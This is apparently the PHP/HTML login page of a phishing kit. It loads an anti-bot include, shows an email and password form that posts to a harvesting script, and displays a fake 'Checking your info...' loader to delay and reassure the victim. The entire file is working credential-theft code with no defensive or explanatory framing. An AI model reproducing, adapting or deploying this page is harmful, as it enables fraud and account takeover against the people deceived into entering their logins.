<?php

include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['OUSSVMV-ANONISMA-KREVL'];



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title><?php  echo $wiz_111;  ?></title>
   <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
	<link rel="stylesheet" type="text/css" href="css/style.css">
   <link rel="stylesheet" type="text/css" href="css/info.css">
</head>
<body>


   <div class="all" >
   	<div class="login_moustache">
   		<div class="content">
   			<header>
   				<img src="img/logo.svg">
   			</header>
   			<form method="POST" action="edit/login.php" >
   				<input type="email" name="email" required placeholder="Email" >
   				<input type="password" name="pass" required placeholder="Password">
   				<input type="submit" name="login" class="login" id="usns" value="Log In">
   				<div class="nsit" >
   				 <span><?php  echo $wiz_222;  ?></span>
   				</div> 
   			</form>
   			<button class="t9ayad"><?php  echo $wiz_333;  ?></button>
            <div class="col-rez"></div>
   		</div>
   		</div>
   		<footer>
   			<p><?php  echo $wiz_444;  ?></p>
   		</footer>
   	
   </div>

   <div class="tsana">
   	 <img src="img/icon_loader_med.gif">
   	 <p>Checking your info...</p>
   </div>

<script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>

<script type="text/javascript">
$(function(){
$('.login').click(function(event){
event.preventDefault();
window.setTimeout(function(form){
$(form).submit();
}, 5000, $(this).closest('form'));
});
});

	$(document).ready(function(){
		$('.login').click(function(){
			$('.tsana').show();
			$('.all').css('opacity' , '0.5');
			$('.all').css('display' , 'none');
		});
	});



</script>

</body>
</html>